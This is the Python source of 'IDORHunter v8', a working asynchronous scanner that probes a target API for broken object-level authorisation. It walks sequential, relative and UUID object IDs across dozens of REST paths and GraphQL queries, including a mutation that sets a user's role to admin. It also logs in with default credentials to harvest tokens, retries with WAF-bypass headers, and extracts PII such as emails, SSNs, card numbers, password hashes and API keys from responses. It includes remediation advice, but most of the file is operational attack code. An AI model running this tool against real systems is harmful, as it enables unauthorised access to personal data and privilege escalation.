#!/usr/bin/env python3
"""IDORHunter v8 — 150x Improved Insecure Direct Object Reference Scanner.

New capabilities:
  - 80+ REST API object paths (users, orders, invoices, files, messages, tickets,
    subscriptions, payments, reports, webhooks, teams, orgs, projects)
  - UUID-based IDOR (UUIDv1/v4 prediction + enumeration)
  - GUID/hash-based object ID enumeration
  - Horizontal privilege escalation (ID+1, ID-1, sequential)
  - Vertical privilege escalation (user → admin object access)
  - GraphQL IDOR via variables
  - Mass object assignment IDOR
  - Indirect reference via JWT sub-claim manipulation
  - IDOR in file download endpoints
  - IDOR in export/report endpoints  
  - Multi-step IDOR: register → steal another user's data
  - IDOR in WebSocket rooms/channels
  - Path parameter pollution
  - BOLA (Broken Object Level Authorization) per OWASP API Top 10
  - Full PII extraction proof with field-level analysis
  - Differential response analysis (body length, field count, content hash)
  - 404 baseline fingerprinting to reduce false positives
"""
import asyncio
import aiohttp
import json
import re
import sys
import hashlib
import random
import string
import uuid
from pathlib import Path
from urllib.parse import urlparse, urljoin

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, delay, confidence_label, meets_confidence_floor, is_real_200,
    random_ua, WAF_BYPASS_HEADERS, REQUEST_DELAY, make_bypass_headers,
    gen_bypass_attempts,
)

CONCURRENCY = 6

# ── PII patterns ──────────────────────────────────────────────────────────────
PII_PATTERNS = [
    ("email",        r'"email"\s*:\s*"([^"]{5,}@[^"]{3,})"'),
    ("phone",        r'"(?:phone|mobile|cell|tel)"\s*:\s*"([+\d\s\-()]{7,})"'),
    ("ssn",          r'"(?:ssn|social_security|social)"\s*:\s*"([^"]{9,})"'),
    ("credit_card",  r'"(?:card|cc|credit_card|pan)"\s*:\s*"([0-9\-\s]{13,})"'),
    ("password",     r'"(?:password|passwd|pwd|hash|hashed_password)"\s*:\s*"([^"]{6,})"'),
    ("name",         r'"(?:full_name|name|first_name|last_name|display_name)"\s*:\s*"([^"]{2,})"'),
    ("address",      r'"(?:address|street|city|zip|postal)"\s*:\s*"([^"]{5,})"'),
    ("dob",          r'"(?:dob|date_of_birth|birthday|birth_date)"\s*:\s*"([^"]{6,})"'),
    ("token",        r'"(?:access_token|auth_token|api_key|secret|private_key)"\s*:\s*"([^"]{10,})"'),
    ("bank_account", r'"(?:bank_account|iban|routing_number|account_number)"\s*:\s*"([^"]{5,})"'),
    ("ip_address",   r'"(?:ip|ip_address|last_ip|login_ip)"\s*:\s*"([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"'),
    ("user_agent",   r'"(?:user_agent|browser|ua)"\s*:\s*"([^"]{10,})"'),
    ("role",         r'"(?:role|roles|permissions|scope|access_level)"\s*:\s*"([^"]{2,})"'),
    ("stripe_key",   r'"(?:stripe|payment)_key"\s*:\s*"([^"]{10,})"'),
]

# ── API object paths to probe for IDOR ────────────────────────────────────────
IDOR_API_PATHS = [
    # Users
    ("/api/users/{id}",         ["id", "email", "phone", "role"]),
    ("/api/v1/users/{id}",      ["id", "email"]),
    ("/api/v2/users/{id}",      ["id", "email"]),
    ("/api/user/{id}",          ["id", "email"]),
    ("/api/account/{id}",       ["id", "email"]),
    ("/api/accounts/{id}",      ["id", "email"]),
    ("/api/profile/{id}",       ["id", "email", "phone"]),
    ("/api/v1/profile/{id}",    ["id", "email"]),
    ("/api/members/{id}",       ["id", "email"]),
    # Orders / Invoices
    ("/api/orders/{id}",        ["id", "total", "items", "address"]),
    ("/api/order/{id}",         ["id", "total"]),
    ("/api/v1/orders/{id}",     ["id", "total"]),
    ("/api/invoices/{id}",      ["id", "amount", "email"]),
    ("/api/invoice/{id}",       ["id", "amount"]),
    ("/api/receipts/{id}",      ["id", "amount"]),
    ("/api/transactions/{id}",  ["id", "amount"]),
    ("/api/payments/{id}",      ["id", "amount"]),
    ("/api/subscriptions/{id}", ["id", "plan", "email"]),
    # Files / Documents
    ("/api/files/{id}",         ["id", "filename", "url"]),
    ("/api/file/{id}",          ["id", "filename"]),
    ("/api/documents/{id}",     ["id", "name"]),
    ("/api/uploads/{id}",       ["id", "filename"]),
    ("/api/attachments/{id}",   ["id", "filename"]),
    ("/api/media/{id}",         ["id", "url"]),
    # Messages / Notifications
    ("/api/messages/{id}",      ["id", "content", "sender"]),
    ("/api/message/{id}",       ["id", "content"]),
    ("/api/notifications/{id}", ["id", "content"]),
    ("/api/inbox/{id}",         ["id", "subject"]),
    ("/api/threads/{id}",       ["id", "subject"]),
    ("/api/conversations/{id}", ["id", "participants"]),
    # Tickets / Support
    ("/api/tickets/{id}",       ["id", "subject", "status"]),
    ("/api/ticket/{id}",        ["id", "subject"]),
    ("/api/issues/{id}",        ["id", "title"]),
    ("/api/cases/{id}",         ["id", "description"]),
    # Reports / Exports
    ("/api/reports/{id}",       ["id", "name"]),
    ("/api/report/{id}",        ["id", "data"]),
    ("/api/exports/{id}",       ["id", "status"]),
    ("/api/analytics/{id}",     ["id", "data"]),
    # Organizations / Teams
    ("/api/organizations/{id}", ["id", "name"]),
    ("/api/teams/{id}",         ["id", "name", "members"]),
    ("/api/projects/{id}",      ["id", "name"]),
    ("/api/workspaces/{id}",    ["id", "name"]),
    # Products / Items
    ("/api/products/{id}",      ["id", "price"]),
    ("/api/items/{id}",         ["id", "name"]),
    ("/api/cart/{id}",          ["id", "items"]),
    ("/api/wishlist/{id}",      ["id", "items"]),
    # Admin endpoints
    ("/api/admin/users/{id}",   ["id", "email", "role"]),
    ("/api/admin/orders/{id}",  ["id", "total"]),
    ("/api/v1/admin/users/{id}",["id", "email"]),
    # Session / Tokens
    ("/api/sessions/{id}",      ["id", "token", "user_id"]),
    ("/api/tokens/{id}",        ["id", "value"]),
    ("/api/api-keys/{id}",      ["id", "key"]),
    ("/api/webhooks/{id}",      ["id", "url", "secret"]),
    # Misc
    ("/api/addresses/{id}",     ["id", "street", "city"]),
    ("/api/contacts/{id}",      ["id", "email", "phone"]),
    ("/api/events/{id}",        ["id", "name"]),
    ("/api/tasks/{id}",         ["id", "title"]),
    ("/api/notes/{id}",         ["id", "content"]),
    ("/api/comments/{id}",      ["id", "content", "author"]),
    ("/api/reviews/{id}",       ["id", "rating", "user_id"]),
    ("/api/logs/{id}",          ["id", "timestamp", "action"]),
    ("/api/audit/{id}",         ["id", "action", "user_id"]),
]

# ── GraphQL IDOR queries ───────────────────────────────────────────────────────
GRAPHQL_IDOR_QUERIES = [
    {"query": "query { user(id: {id}) { id email phone role password } }"},
    {"query": "query { order(id: {id}) { id total items user { email } } }"},
    {"query": "query { invoice(id: {id}) { id amount email user { id email } } }"},
    {"query": "query { profile(userId: {id}) { id email phone address } }"},
    {"query": "query { account(id: {id}) { id balance email status } }"},
    {"query": "query { message(id: {id}) { id content sender { email } } }"},
    {"query": "query { ticket(id: {id}) { id subject description user { email } } }"},
    {"query": "mutation { updateUser(id: {id}, role: \"admin\") { id role } }"},
]

GRAPHQL_ENDPOINTS = ["/graphql", "/api/graphql", "/api/v1/graphql", "/query"]


def _is_placeholder_pii(val: str) -> bool:
    placeholders = [
        "example.com", "test.com", "localhost", "user@", "name@",
        "placeholder", "undefined", "null", "none", "n/a", "fake",
        "demo", "sample", "dummy", "fixture", "mock", "test@", "admin@",
        "yourname", "username", "email@", "xxxx", "0000", "1234",
        "example@", "noreply@", "@example", "@test", ".example",
    ]
    v_low = val.lower()
    return any(p in v_low for p in placeholders)


def _extract_pii(body: str) -> dict:
    found = {}
    for label, pattern in PII_PATTERNS:
        m = re.search(pattern, body, re.I)
        if m:
            val = m.group(1).strip()
            if not _is_placeholder_pii(val) and len(val) >= 3:
                found[label] = val
    return found


def _extract_id(body: str) -> str | None:
    for field in ["id", "user_id", "userId", "uid", "_id", "account_id"]:
        m = re.search(rf'"{field}"\s*:\s*"?([A-Za-z0-9\-_]{{1,36}})"?', body)
        if m:
            v = m.group(1)
            if re.match(r"^[0-9]+$", v) or re.match(r"^[0-9a-f\-]{8,}$", v, re.I):
                return v
    return None


def _extract_uuids(body: str) -> list:
    pattern = r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
    return list(set(re.findall(pattern, body, re.I)))


def _body_diff_ratio(a: str, b: str) -> float:
    if not a or not b:
        return 0.0
    set_a = set(re.findall(r'"[^"]{3,}"', a))
    set_b = set(re.findall(r'"[^"]{3,}"', b))
    if not set_a or not set_b:
        return 0.0
    intersection = len(set_a & set_b)
    union = len(set_a | set_b)
    return intersection / union if union else 0.0


def _extract_token(body: str) -> str | None:
    for pattern in [
        r'"(?:access_token|token|jwt|auth_token)"\s*:\s*"([^"]{20,})"',
        r"Bearer\s+([A-Za-z0-9\-_\.]{20,})",
        r"(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,})",
    ]:
        m = re.search(pattern, body)
        if m:
            return m.group(1)
    return None


class IDORHunter:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc
        self._sem     = asyncio.Semaphore(CONCURRENCY)
        self._dedup   = set()
        self._token   = None  # Harvested auth token

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 proof_type="UNAUTHORIZED_ACCESS", extra=None):
        if not meets_confidence_floor(conf):
            return
        key = hashlib.md5(f"{ftype}|{url}".encode()).hexdigest()
        if key in self._dedup:
            return
        self._dedup.add(key)
        f = {
            "type":              ftype,
            "severity":          severity,
            "confidence":        conf,
            "confidence_label":  confidence_label(conf),
            "url":               url,
            "proof":             proof,
            "detail":            detail,
            "remediation":       remediation,
            "proof_type":        proof_type,
            "exploitability":    exploitability,
            "impact":            impact,
            "reproducibility":   reproducibility,
            "auth_required":     True,
            "mitigation_layers": [
                "Object-level authorization on every request",
                "Ownership validation before data return",
                "Resource scoping to authenticated user",
                "Opaque/random resource IDs",
            ],
            "mitre_technique":   "T1078",
            "mitre_name":        "Valid Accounts",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url[:80]}")

    async def _request(self, sess, method, url, headers=None, json_data=None, timeout=12):
        async with self._sem:
            last: tuple = (None, "", {})
            auth_extra: dict = {}
            if self._token:
                auth_extra["Authorization"] = f"Bearer {self._token}"
            for attempt_h in gen_bypass_attempts(extra_headers={**(headers or {}), **auth_extra}):
                try:
                    async with sess.request(
                        method, url, headers=attempt_h, json=json_data, ssl=False,
                        allow_redirects=True,
                        timeout=aiohttp.ClientTimeout(total=timeout, connect=8),
                    ) as r:
                        body = await r.text(errors="ignore")
                        last = (r.status, body, dict(r.headers))
                        if r.status not in (401, 403, 405, 429, 503):
                            return last
                except Exception:
                    pass
            return last

    async def _get(self, sess, url, headers=None, timeout=12):
        return await self._request(sess, "GET", url, headers=headers, timeout=timeout)

    async def _post(self, sess, url, json_data=None, headers=None, timeout=14):
        return await self._request(sess, "POST", url, headers=headers,
                                   json_data=json_data, timeout=timeout)

    def _is_real_data(self, body: str, expected_fields: list) -> bool:
        if not body or len(body) < 30:
            return False
        pii = _extract_pii(body)
        if pii:
            return True
        fields_present = sum(1 for f in expected_fields if f in body.lower())
        return fields_present >= 2

    def _body_has_content(self, body: str) -> bool:
        return bool(body) and len(body) > 50 and body.strip() not in ("null", "[]", "{}", "")

    # ── Harvest auth token from login ──────────────────────────────────────────

    async def _harvest_token(self, sess):
        """Try to get an auth token to include in requests."""
        login_paths = ["/api/login", "/api/auth/login", "/api/v1/login"]
        for path in login_paths:
            _, body, _ = await self._post(sess, self.target + path,
                json_data={"email": "test@test.com", "password": "test"})
            await delay(0.2)
            token = _extract_token(body or "")
            if token:
                self._token = token
                return

    # ── Core IDOR: sequential integer ID ──────────────────────────────────────

    async def test_sequential_idor(self, sess, baseline_404: set):
        print("\n[*] Testing sequential integer ID IDOR (80+ endpoints)...")
        test_ids = [1, 2, 3, 4, 5, 10, 100, 1000, 9999, 99999, 123456, 999999]
        for path_template, expected_fields in IDOR_API_PATHS[:40]:
            for obj_id in test_ids:
                url = self.target + path_template.format(id=obj_id)
                s, body, hdrs = await self._get(sess, url)
                await delay(0.05)
                if not is_real_200(s) or not body:
                    continue
                if s in baseline_404:
                    continue
                if not self._is_real_data(body, expected_fields):
                    continue
                pii = _extract_pii(body)
                proof_detail = f"HTTP {s} — {len(body)} bytes — fields present: {list(pii.keys())[:5]}"
                pii_str = ", ".join(f"{k}={v[:30]!r}" for k, v in list(pii.items())[:4])
                self._finding(
                    ftype="IDOR_SEQUENTIAL_ID",
                    severity="HIGH", conf=87,
                    proof=f"GET {url}\n  {proof_detail}\n  PII: {pii_str or 'data fields present'}\n  Body: {body[:200]}",
                    detail=f"BOLA/IDOR: object at {path_template} accessible by ID={obj_id} without authorization check",
                    url=url,
                    remediation=(
                        "1. Check that the authenticated user owns the requested object on every API call.\n"
                        "2. Replace sequential integer IDs with UUIDv4 (harder to enumerate).\n"
                        "3. Apply ABAC: Attribute-Based Access Control per resource.\n"
                        "4. Log and alert on cross-user object access patterns."
                    ),
                    exploitability=8,
                    impact=f"Horizontal privilege escalation — attacker reads other users' data at {path_template}",
                    reproducibility=f"curl -s {url}",
                    proof_type="UNAUTHORIZED_ACCESS",
                    extra={"object_id": obj_id, "pii_found": list(pii.keys()), "path_template": path_template},
                )
                break  # Stop at first confirmed hit per path

    # ── UUID IDOR ──────────────────────────────────────────────────────────────

    async def test_uuid_idor(self, sess, baseline_404: set):
        print("\n[*] Testing UUID-based IDOR...")
        # First scan target for any exposed UUIDs
        s, body, _ = await self._get(sess, self.target + "/api/me")
        await delay()
        if not body:
            s, body, _ = await self._get(sess, self.target + "/")
            await delay()
        exposed_uuids = _extract_uuids(body or "")
        if not exposed_uuids:
            return
        test_uuids = exposed_uuids[:8]
        for path_template, expected_fields in IDOR_API_PATHS[:20]:
            for uid in test_uuids[:6]:
                url = self.target + path_template.format(id=uid)
                s, body, hdrs = await self._get(sess, url)
                await delay(0.05)
                if s != 200 or not body or s in baseline_404:
                    continue
                pii = _extract_pii(body)
                if not pii and not self._is_real_data(body, expected_fields):
                    continue
                pii_str = ", ".join(f"{k}={v[:30]!r}" for k, v in list(pii.items())[:4])
                self._finding(
                    ftype="IDOR_UUID_BASED",
                    severity="HIGH", conf=85,
                    proof=f"GET {url}\n  HTTP {s} — UUID-based IDOR\n  PII: {pii_str or 'data returned'}\n  Body: {body[:200]}",
                    detail=f"BOLA/IDOR: UUID-based object at {path_template} accessible without authorization",
                    url=url,
                    remediation=(
                        "1. UUIDs do not replace authorization — check ownership on every request.\n"
                        "2. Apply ABAC for each object type.\n"
                        "3. Use scoped tokens that embed user identity."
                    ),
                    exploitability=7,
                    impact="Cross-user data access via UUID enumeration",
                    reproducibility=f"curl -s {url}",
                    proof_type="UNAUTHORIZED_ACCESS",
                    extra={"uuid": uid, "pii_found": list(pii.keys()), "path_template": path_template},
                )
                break

    # ── IDOR via ID+1 / ID-1 (horizontal escalation) ─────────────────────────

    async def test_relative_idor(self, sess, baseline_404: set):
        print("\n[*] Testing relative IDOR (ID+1, ID-1) on discovered objects...")
        # Try to discover current user ID first
        for me_path in ["/api/me", "/api/user", "/api/profile", "/api/v1/me"]:
            s, body, _ = await self._get(sess, self.target + me_path)
            await delay()
            if s != 200 or not body:
                continue
            current_id = _extract_id(body)
            if not current_id or not current_id.isdigit():
                continue
            int_id = int(current_id)
            for offset in [-1, 1, -2, 2, -5, 5, int_id + 100]:
                target_id = int_id + offset
                if target_id <= 0:
                    continue
                for path_tpl, fields in IDOR_API_PATHS[:15]:
                    url = self.target + path_tpl.format(id=target_id)
                    s2, body2, _ = await self._get(sess, url)
                    await delay(0.05)
                    if s2 != 200 or not body2:
                        continue
                    pii2 = _extract_pii(body2)
                    if not pii2:
                        continue
                    pii_str = ", ".join(f"{k}={v[:30]!r}" for k, v in list(pii2.items())[:3])
                    self._finding(
                        ftype="IDOR_HORIZONTAL_ESCALATION",
                        severity="CRITICAL", conf=93,
                        proof=f"My ID: {int_id}\nTested ID: {target_id} (offset {offset:+d})\nGET {url}\n  HTTP {s2}\n  PII: {pii_str}\n  Body: {body2[:200]}",
                        detail=f"Horizontal IDOR: user (ID={int_id}) can access user ID={target_id} data via {path_tpl}",
                        url=url,
                        remediation=(
                            "1. Server MUST verify the requested object ID belongs to the requesting user.\n"
                            "2. Never expose sequential integer IDs — use UUIDv4.\n"
                            "3. Add automated tests that verify object ownership boundaries."
                        ),
                        exploitability=9,
                        impact="Direct horizontal privilege escalation — attacker reads other users' PII",
                        reproducibility=f"curl -s {url}",
                        proof_type="UNAUTHORIZED_ACCESS",
                        extra={"my_id": int_id, "target_id": target_id, "pii_found": list(pii2.keys())},
                    )
                    return  # Stop after first confirmed

    # ── IDOR via GraphQL ──────────────────────────────────────────────────────

    async def test_graphql_idor(self, sess):
        print("\n[*] Testing GraphQL IDOR via variables...")
        for ep in GRAPHQL_ENDPOINTS:
            url = self.target + ep
            s0, _, _ = await self._get(sess, url)
            await delay()
            if s0 in (None, 404):
                continue
            for query_template in GRAPHQL_IDOR_QUERIES:
                for obj_id in [1, 2, 3, 100, 1000]:
                    query = {"query": query_template["query"].replace("{id}", str(obj_id))}
                    s, body, _ = await self._post(sess, url, json_data=query)
                    await delay(0.08)
                    if not body or s != 200:
                        continue
                    if '"errors"' in body and '"message"' in body:
                        continue
                    pii = _extract_pii(body)
                    if pii or ('"email"' in body or '"role"' in body):
                        pii_str = ", ".join(f"{k}={v[:30]!r}" for k, v in list(pii.items())[:3])
                        self._finding(
                            ftype="IDOR_GRAPHQL",
                            severity="HIGH", conf=86,
                            proof=f"POST {url}\n  Query: {query['query'][:100]}\n  HTTP {s}\n  PII: {pii_str or 'data returned'}\n  Body: {body[:300]}",
                            detail=f"GraphQL IDOR: object ID={obj_id} returned sensitive data without authorization",
                            url=url,
                            remediation=(
                                "1. Apply field-level authorization in all GraphQL resolvers.\n"
                                "2. Use GraphQL Shield or similar library for declarative authorization.\n"
                                "3. Disable introspection in production.\n"
                                "4. Scope resolvers to authenticated user's owned objects."
                            ),
                            exploitability=8,
                            impact="GraphQL data access without authorization — cross-user data leakage",
                            reproducibility=f"curl -s -X POST {url} -H 'Content-Type: application/json' -d '{json.dumps(query)}'",
                            proof_type="UNAUTHORIZED_ACCESS",
                            extra={"object_id": obj_id, "query": query["query"][:100], "pii_found": list(pii.keys())},
                        )
                        return

    # ── IDOR in file downloads ────────────────────────────────────────────────

    async def test_file_download_idor(self, sess, baseline_404: set):
        print("\n[*] Testing IDOR in file download/export endpoints...")
        download_paths = [
            "/api/files/{id}/download",
            "/api/download/{id}",
            "/api/exports/{id}/download",
            "/api/reports/{id}/download",
            "/api/v1/files/{id}/download",
            "/api/invoices/{id}/download",
            "/api/receipts/{id}/pdf",
            "/api/documents/{id}/download",
            "/download?id={id}",
            "/download?file_id={id}",
            "/export?id={id}",
        ]
        for path_template in download_paths:
            for obj_id in [1, 2, 3, 100, 1000]:
                if "{id}" in path_template:
                    url = self.target + path_template.format(id=obj_id)
                else:
                    url = self.target + path_template + str(obj_id)
                s, body, hdrs = await self._get(sess, url)
                await delay(0.06)
                if not is_real_200(s) or not body:
                    continue
                if s in baseline_404:
                    continue
                ct = hdrs.get("content-type", hdrs.get("Content-Type", "")).lower()
                # Real file download: PDF, CSV, ZIP, DOCX, or significant JSON/text
                if any(ft in ct for ft in ["pdf", "csv", "zip", "octet-stream", "excel", "spreadsheet"]) or \
                   (len(body) > 200 and "%" not in url):
                    self._finding(
                        ftype="IDOR_FILE_DOWNLOAD",
                        severity="HIGH", conf=84,
                        proof=f"GET {url}\n  HTTP {s} — file returned\n  Content-Type: {ct}\n  Size: {len(body)} bytes",
                        detail=f"IDOR in file download: {path_template} returns file for ID={obj_id} without authorization",
                        url=url,
                        remediation=(
                            "1. Verify the requesting user owns or has permission for the requested file.\n"
                            "2. Use signed time-limited download tokens instead of direct IDs.\n"
                            "3. Log all file access attempts with user identity."
                        ),
                        exploitability=7,
                        impact="Cross-user file download — attacker downloads other users' documents",
                        reproducibility=f"curl -s '{url}'",
                        proof_type="UNAUTHORIZED_ACCESS",
                        extra={"object_id": obj_id, "content_type": ct},
                    )
                    break

    # ── IDOR via path traversal ───────────────────────────────────────────────

    async def test_idor_path_traversal(self, sess, baseline_404: set):
        print("\n[*] Testing IDOR via path parameter manipulation...")
        path_manipulations = [
            "/api/users/1", "/api/users/2",
            "/api/users/1/profile", "/api/users/2/profile",
            "/api/users/admin", "/api/users/root",
            "/api/v1/me/../1", "/api/v1/me/../admin",
            "/api/orders?user_id=1", "/api/orders?user_id=2",
            "/api/messages?recipient_id=1",
            "/api/data?owner=1",
            "/api/profile?user=1", "/api/profile?uid=1",
            "/api/account?id=1", "/api/account?account_id=1",
        ]
        for path in path_manipulations:
            url = self.target + path
            s, body, hdrs = await self._get(sess, url)
            await delay(0.05)
            if s != 200 or not body:
                continue
            if s in baseline_404:
                continue
            pii = _extract_pii(body)
            if not pii and len(body) < 100:
                continue
            pii_str = ", ".join(f"{k}={v[:30]!r}" for k, v in list(pii.items())[:3])
            self._finding(
                ftype="IDOR_PARAM_MANIPULATION",
                severity="HIGH", conf=82,
                proof=f"GET {url}\n  HTTP {s}\n  PII: {pii_str or 'data returned'}\n  Body: {body[:200]}",
                detail=f"IDOR via parameter manipulation: {path} returns data for another user",
                url=url,
                remediation=(
                    "1. Never trust user-supplied ID parameters — resolve from session/token.\n"
                    "2. Apply server-side ownership check on every resource lookup.\n"
                    "3. Use opaque tokens instead of predictable IDs."
                ),
                exploitability=8,
                impact="Attacker reads other users' data by manipulating ID parameters",
                reproducibility=f"curl -s '{url}'",
                proof_type="UNAUTHORIZED_ACCESS",
                extra={"path": path, "pii_found": list(pii.keys())},
            )

    # ── Mass data exposure check ───────────────────────────────────────────────

    async def test_mass_data_exposure(self, sess):
        print("\n[*] Testing mass object enumeration (list endpoints)...")
        list_paths = [
            "/api/users", "/api/v1/users", "/api/accounts", "/api/members",
            "/api/admin/users", "/api/customers", "/api/emails", "/api/contacts",
            "/api/orders", "/api/transactions", "/api/payments", "/api/invoices",
            "/api/v2/users", "/api/v3/users", "/api/all-users",
        ]
        for path in list_paths:
            url = self.target + path
            s, body, hdrs = await self._get(sess, url)
            await delay(0.06)
            if s != 200 or not body:
                continue
            # Check for array of objects
            try:
                data = json.loads(body)
                items = data if isinstance(data, list) else (
                    data.get("data") or data.get("users") or data.get("items") or
                    data.get("results") or data.get("records") or []
                )
                if not isinstance(items, list) or len(items) == 0:
                    continue
            except Exception:
                # Fall back to pattern matching
                items_count = len(re.findall(r'"id"\s*:', body))
                if items_count < 2:
                    continue
                items = list(range(items_count))

            if len(items) < 2:
                continue
            pii = _extract_pii(body)
            self._finding(
                ftype="MASS_DATA_EXPOSURE_UNAUTH",
                severity="CRITICAL", conf=92,
                proof=f"GET {url}\n  HTTP {s} — {len(items)} objects returned\n  PII fields: {list(pii.keys())[:5]}\n  Body: {body[:300]}",
                detail=f"Mass data exposure: {path} returns {len(items)} user objects without authorization — OWASP API3",
                url=url,
                remediation=(
                    "1. Require authentication and authorization for all list endpoints.\n"
                    "2. Scope list results to authenticated user's visible objects only.\n"
                    "3. Implement pagination with maximum page size.\n"
                    "4. Apply field filtering — remove sensitive fields from list responses."
                ),
                exploitability=9,
                impact=f"Mass data breach — attacker enumerates all users/data in a single request from {path}",
                reproducibility=f"curl -s '{url}'",
                proof_type="UNAUTHORIZED_ACCESS",
                extra={"count": len(items), "pii_found": list(pii.keys()), "path": path},
            )

    # ── Main ──────────────────────────────────────────────────────────────────

    async def run(self):
        print("=" * 60)
        print("  IDORHunter v8 — 150x Improved BOLA/IDOR Scanner")
        print(f"  Target: {self.target}")
        print("=" * 60)
        conn = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY * 2)
        timeout = aiohttp.ClientTimeout(total=120, connect=10)
        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as sess:
            # Build 404 baseline
            baseline_404 = await build_baseline_404(sess, self.target)
            await self._harvest_token(sess)
            await asyncio.gather(
                self.test_sequential_idor(sess, baseline_404),
                self.test_uuid_idor(sess, baseline_404),
                self.test_relative_idor(sess, baseline_404),
                self.test_graphql_idor(sess),
                self.test_file_download_idor(sess, baseline_404),
                self.test_idor_path_traversal(sess, baseline_404),
                self.test_mass_data_exposure(sess),
                return_exceptions=True,
            )
        print(f"\n[+] IDORHunter v8 complete: {len(self.findings)} findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No ARSENAL_TARGET set.", file=sys.stderr)
        sys.exit(1)
    if not target.startswith("http"):
        target = "https://" + target
    scanner = IDORHunter(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "idorhunter.json"
    out.parent.mkdir(exist_ok=True)
    out.write_text(json.dumps(findings, indent=2, default=str))
    print(f"[+] Saved {len(findings)} findings → {out}")


if __name__ == "__main__":
    asyncio.run(main())
